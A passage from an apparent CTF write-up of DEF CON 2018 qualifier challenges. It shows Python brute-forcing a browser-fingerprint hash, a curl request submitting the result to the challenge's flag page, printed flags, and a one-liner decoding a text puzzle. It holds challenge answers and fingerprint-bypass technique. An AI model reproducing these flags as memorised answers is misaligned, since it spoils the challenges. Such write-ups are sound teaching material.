</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>datax</span><span class=p>[</span><span class=n>maxv</span><span class=p>[</span><span class=mi>2</span><span class=p>]][</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;--Neuron </span><span class=si>%d</span><span class=s2>: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>oo</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>datalet</span><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>out</span><span class=p>])))</span>
</span></span></code></pre></div><h2 class="relative group">Geckome<div id=geckome class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#geckome aria-label=Anchor>#</a></span></h2><p>Another web challenge, this time served at <a href=http://d2b24dd8.quals2018.oooverflow.io target=_blank>http://d2b24dd8.quals2018.oooverflow.io</a>. After logging in with the provided credentials <code>admin@oooverflow.io:admin</code>, we are redirected to the following <a href=http://d2b24dd8.quals2018.oooverflow.io/browsertest.php target=_blank>browser test page</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Testing the browser...<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>            <span class=p>#</span><span class=nn>animated_div</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>width</span><span class=p>:</span><span class=mi>120</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>height</span><span class=p>:</span><span class=mi>47</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>background</span><span class=p>:</span> <span class=mh>#92B901</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>color</span><span class=p>:</span> <span class=mh>#ffffff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>position</span><span class=p>:</span> <span class=kc>relative</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>font-weight</span><span class=p>:</span><span class=kc>bold</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>font-size</span><span class=p>:</span><span class=mi>20</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>padding</span><span class=p>:</span><span class=mi>10</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kp>-webkit-</span><span class=k>animation</span><span class=p>:</span><span class=n>animated_div</span> <span class=mi>5</span><span class=kt>s</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>border-radius</span><span class=p>:</span><span class=mi>5</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=kp>-webkit-</span><span class=k>border-radius</span><span class=p>:</span><span class=mi>5</span><span class=kt>px</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=p>@</span><span class=k>-webkit-keyframes</span> <span class=nt>animated_div</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>0</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>0</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>0</span><span class=kt>px</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=nt>25</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>20</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>0</span><span class=kt>px</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=nt>50</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>0</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>500</span><span class=kt>px</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=nt>55</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>0</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>500</span><span class=kt>px</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=nt>70</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>0</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>500</span><span class=kt>px</span><span class=p>;</span><span class=k>background</span><span class=p>:</span><span class=mh>#1ec7e6</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=nt>100</span><span class=o>%</span> <span class=p>{</span><span class=kp>-webkit-</span><span class=k>transform</span><span class=p>:</span> <span class=nb>rotate</span><span class=p>(</span><span class=mi>-360</span><span class=kt>deg</span><span class=p>);</span><span class=k>left</span><span class=p>:</span><span class=mi>0</span><span class=kt>px</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>video</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;v&#34;</span> <span class=na>autoplay</span><span class=p>&gt;</span> <span class=p>&lt;/</span><span class=nt>video</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;https://www.w3schools.com/html&#34;</span> <span class=na>ping</span><span class=o>=</span><span class=s>&#34;https://www.w3schools.com/trackpings&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span> <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;p()&#34;</span><span class=p>&gt;</span>Click me to print the page.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;prerender&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;https://news.ycombinator.com/&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;animated_div&#34;</span><span class=p>&gt;</span>OOOverflow Securityyy<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>f</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>onLine</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>f</span> <span class=o>+=</span> <span class=s2>&#34;o&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span> <span class=o>+=</span> <span class=nx>navigator</span><span class=p>.</span><span class=nx>vendor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>p</span><span class=p>()</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>print</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* incompatible
</span></span></span><span class=line><span class=cl><span class=cm>        window.onbeforeprint = function () {
</span></span></span><span class=line><span class=cl><span class=cm>            // some code    
</span></span></span><span class=line><span class=cl><span class=cm>        }
</span></span></span><span class=line><span class=cl><span class=cm>        */</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span> <span class=o>+=</span> <span class=nx>navigator</span><span class=p>.</span><span class=nx>mimeTypes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>x</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=k>for</span> <span class=p>(</span> <span class=nx>i</span> <span class=k>in</span> <span class=nx>navigator</span> <span class=p>)</span> <span class=p>{</span> <span class=nx>x</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>}</span> <span class=nx>f</span> <span class=o>+=</span> <span class=nx>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>x</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=k>for</span> <span class=p>(</span> <span class=nx>i</span> <span class=k>in</span> <span class=nb>window</span> <span class=p>)</span> <span class=p>{</span> <span class=nx>x</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>}</span> <span class=nx>f</span> <span class=o>+=</span> <span class=nx>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=c1>// hash
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>function</span> <span class=nx>str2ab</span><span class=p>(</span><span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>buf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=nx>str</span><span class=p>.</span><span class=nx>length</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span> <span class=c1>// 2 bytes for each char
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kd>var</span> <span class=nx>bufView</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint16Array</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strLen</span><span class=o>=</span><span class=nx>str</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>&lt;</span><span class=nx>strLen</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>bufView</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nx>str</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>sha256</span><span class=p>(</span><span class=nx>str</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// We transform the string into an arraybuffer.
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=kd>var</span> <span class=nx>buffer</span> <span class=o>=</span> <span class=nx>str2ab</span><span class=p>(</span><span class=nx>str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>subtle</span><span class=p>.</span><span class=nx>digest</span><span class=p>({</span><span class=nx>name</span><span class=o>:</span><span class=s2>&#34;SHA-256&#34;</span><span class=p>},</span> <span class=nx>buffer</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=kd>function</span> <span class=p>(</span><span class=nx>hash</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nx>hex</span><span class=p>(</span><span class=nx>hash</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>hex</span><span class=p>(</span><span class=nx>buffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>hexCodes</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>view</span><span class=p>.</span><span class=nx>byteLength</span><span class=p>;</span> <span class=nx>i</span> <span class=o>+=</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>// Using getUint32 reduces the number of iterations needed (we process 4 bytes each time)
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=kd>var</span> <span class=nx>value</span> <span class=o>=</span> <span class=nx>view</span><span class=p>.</span><span class=nx>getUint32</span><span class=p>(</span><span class=nx>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=c1>// toString(16) will give the hex representation of the number without padding
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=kd>var</span> <span class=nx>stringValue</span> <span class=o>=</span> <span class=nx>value</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=c1>// We use concatenation and slice for padding
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=kd>var</span> <span class=nx>padding</span> <span class=o>=</span> <span class=s1>&#39;00000000&#39;</span>
</span></span><span class=line><span class=cl>                <span class=kd>var</span> <span class=nx>paddedValue</span> <span class=o>=</span> <span class=p>(</span><span class=nx>padding</span> <span class=o>+</span> <span class=nx>stringValue</span><span class=p>).</span><span class=nx>slice</span><span class=p>(</span><span class=o>-</span><span class=nx>padding</span><span class=p>.</span><span class=nx>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nx>hexCodes</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>paddedValue</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// Join all the hex strings into one
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=nx>hexCodes</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span> <span class=o>+=</span> <span class=nx>navigator</span><span class=p>.</span><span class=nx>plugins</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span> <span class=o>+=</span> <span class=nx>navigator</span><span class=p>.</span><span class=nx>plugins</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=nx>description</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>sha256</span><span class=p>(</span><span class=nx>f</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>digest</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>digest</span> <span class=o>==</span> <span class=s2>&#34;31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;flag.php?f=&#34;</span> <span class=o>+</span><span class=nx>btoa</span><span class=p>(</span><span class=nx>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>x</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;animated_div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>z</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>z</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;Test Failed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>z</span><span class=p>.</span><span class=nx>id</span><span class=o>=</span><span class=s2>&#34;animated_div&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span><span class=nx>x</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>z</span><span class=p>)},</span> <span class=mi>5000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;FIN&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>A quick overview of the inline script suggests that the flag can be accessed by the admin iff a matching browser is used. The client is checked for the presence of certain plugins, the ability to execute selected APIs outside secure-contexts such as <code>SubtleCrypto</code> and lack of support for <code>window.onbeforeprint</code> (see the commented out code in the js). Moreover, several <code>-webkit-</code> prefixed CSS rules wink at WebKit-powered user agents.</p><p>By cross-checking all the conditions, the list of possible candidates reduced to Google Chrome between versions 37 and 39 (included). At this point it was just a matter of running these <a href=https://google-chrome.en.uptodown.com/ubuntu/old target=_blank>old browsers</a> inside a VM, dump the list of plugins along with other features exploited by the fingerprinting function and use a bit of (brute) force.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=s1>&#39;31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mime_types</span> <span class=o>=</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>navigator</span> <span class=o>=</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>46</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>windows</span> <span class=o>=</span> <span class=nb>range</span><span class=p>(</span><span class=mi>150</span><span class=p>,</span> <span class=mi>231</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vendors</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;Google Inc.&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>plugin0_filenames</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;libwidevinecdmadapter.so&#39;</span><span class=p>,</span> <span class=s1>&#39;libppGoogleNaClPluginChrome.dll&#39;</span><span class=p>,</span> <span class=s1>&#39;undefined&#39;</span><span class=p>,</span> <span class=s1>&#39;libpepflashplayer.dll&#39;</span><span class=p>,</span> <span class=s1>&#39;libppGoogleNaClPluginChrome.so&#39;</span><span class=p>,</span> <span class=s1>&#39;internal-remoting-viewer&#39;</span><span class=p>,</span> <span class=s1>&#39;libpepflashplayer.so&#39;</span><span class=p>,</span> <span class=s1>&#39;internal-nacl-plugin&#39;</span><span class=p>,</span> <span class=s1>&#39;internal-pdf-viewer&#39;</span><span class=p>,</span> <span class=s1>&#39;mhjfbmdgcfjbbpaeojofohoefgiehjai&#39;</span><span class=p>,</span> <span class=s1>&#39;libwidevinecdmadapter.dll&#39;</span><span class=p>,</span> <span class=s1>&#39;libpdf.so&#39;</span><span class=p>,</span> <span class=s1>&#39;libpdf.dll&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>plugin1_descr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;This plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the &lt;a href=&#34;https://chrome.google.com/remotedesktop&#34;&gt;Chrome Remote Desktop&lt;/a&gt; webapp.&#39;</span><span class=p>,</span> <span class=s1>&#39;undefined&#39;</span><span class=p>,</span> <span class=s1>&#39;Shockwave Flash 14.0 r0&#39;</span><span class=p>,</span> <span class=s1>&#39;Enables Widevine licenses for playback of HTML audio/video content.&#39;</span><span class=p>,</span> <span class=s1>&#39;Portable Document Format&#39;</span><span class=p>,</span> <span class=s1>&#39;Enables Widevine licenses for playback of HTML audio/video content. (version: Something fresh)&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=s1>&#39;Shockwave Flash </span><span class=si>{}</span><span class=s1>.</span><span class=si>{}</span><span class=s1> r0&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>maj</span><span class=p>,</span> <span class=n>mino</span><span class=p>)</span> <span class=k>for</span> <span class=n>maj</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>)</span> <span class=k>for</span> <span class=n>mino</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>ven</span> <span class=ow>in</span> <span class=n>vendors</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>mt</span> <span class=ow>in</span> <span class=n>mime_types</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=n>nav</span> <span class=ow>in</span> <span class=n>navigator</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=k>for</span> <span class=n>win</span> <span class=ow>in</span> <span class=n>windows</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=k>for</span> <span class=n>p0</span> <span class=ow>in</span> <span class=n>plugin0_filenames</span><span class=p>:</span>
</span></span><span class=line><span class=cl>					<span class=k>for</span> <span class=n>p1</span> <span class=ow>in</span> <span class=n>plugin1_descr</span><span class=p>:</span>
</span></span><span class=line><span class=cl>						<span class=c1># simulate utf-16 encoding</span>
</span></span><span class=line><span class=cl>						<span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>c</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=s1>&#39;o</span><span class=si>{}{}{}{}{}{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ven</span><span class=p>,</span> <span class=n>mt</span><span class=p>,</span> <span class=n>nav</span><span class=p>,</span> <span class=n>win</span><span class=p>,</span> <span class=n>p0</span><span class=p>,</span> <span class=n>p1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>						<span class=k>if</span> <span class=n>h</span> <span class=o>==</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>():</span>
</span></span><span class=line><span class=cl>							<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[FOUND] </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>							<span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><p>The script returns the string <code>oGoogle Inc.828186libpepflashplayer.soThis plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the &lt;a href="https://chrome.google.com/remotedesktop">Chrome Remote Desktop&lt;/a> webapp.</code> that can be used, in a base64-encoded form, to access the flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl <span class=s1>&#39;http://d2b24dd8.quals2018.oooverflow.io/flag.php?f=b0dvb2dsZSBJbmMuODI4MTg2bGlicGVwZmxhc2hwbGF5ZXIuc29UaGlzIHBsdWdpbiBhbGxvd3MgeW91IHRvIHNlY3VyZWx5IGFjY2VzcyBvdGhlciBjb21wdXRlcnMgdGhhdCBoYXZlIGJlZW4gc2hhcmVkIHdpdGggeW91LiBUbyB1c2UgdGhpcyBwbHVnaW4geW91IG11c3QgZmlyc3QgaW5zdGFsbCB0aGUgPGEgaHJlZj0iaHR0cHM6Ly9jaHJvbWUuZ29vZ2xlLmNvbS9yZW1vdGVkZXNrdG9wIj5DaHJvbWUgUmVtb3RlIERlc2t0b3A8L2E+IHdlYmFwcC4=&#39;</span>
</span></span><span class=line><span class=cl>OOO<span class=o>{</span>th3r3c@nb30nly0n3br0ws3r!<span class=o>}</span>
</span></span></code></pre></div><p>Flag: <code>OOO{th3r3c@nb30nly0n3br0ws3r!}</code></p><h2 class="relative group">Ghettohackers: Throwback<div id=ghettohackers-throwback class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#ghettohackers-throwback aria-label=Anchor>#</a></span></h2><p>A .txt file is provided with the following content:</p><pre tabindex=0><code>Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!
</code></pre><p>Given that our brains have been compromised since a long time by playing too many CTFs, we quickly figured out that it was enough to count the number of chars before each <code>!</code> to get the index of a single letter of the flag. For instance, <code>Anyo! = d</code> because there are 4 chars before the <code>!</code> and so we must consider the 4th letter of the English alphabet.</p><p>Python one-liner to solve the challenge:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=n>s</span> <span class=o>=</span> <span class=s1>&#39;Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!&#39;</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>c</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=k>if</span> <span class=n>c</span> <span class=k>else</span> <span class=s1>&#39; &#39;</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>s</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;!&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>rstrip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;dark logic&#39;</span>
